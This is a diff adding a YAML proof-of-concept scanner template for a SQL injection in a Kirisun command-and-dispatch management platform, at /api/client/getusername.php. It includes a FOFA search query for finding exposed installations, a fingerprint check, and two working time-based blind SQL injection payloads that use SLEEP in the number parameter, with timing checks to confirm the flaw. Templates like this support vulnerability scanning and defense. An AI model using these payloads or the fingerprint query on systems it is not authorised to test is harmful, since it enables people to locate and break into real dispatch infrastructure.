@@ -1,0 +1,27 @@
+id: poc-yaml-kirisun-getusername-number-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 /api/client/getusername SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科立讯指挥调度管理平台
+  fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+variables:
+  t1: random_int(6,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+firstRequest:
+  method: GET
+  path: /
+  expression: "status_code == 200 && \ncontains(title,`指挥调度管理平台`) &&\ncontains(body,`app/structure/departments.php`)\n"
+requests:
+- method: GET
+  path: /api/client/getusername.php?number=1%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP({{.t1}})))FIjE)
+  expression: "status_code == 200 && \nduration >= t1 &&\nduration <= t2 &&\n!contains(body,\"\
+    <\")\n"
+- method: GET
+  path: /api/client/getusername.php?number=1%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP({{.t3}})))FIjE)
+  expression: "status_code == 200 && \nduration >= t3 &&\nduration <= t4 &&\n!contains(body,\"\
+    <\")\n"
+transport: http
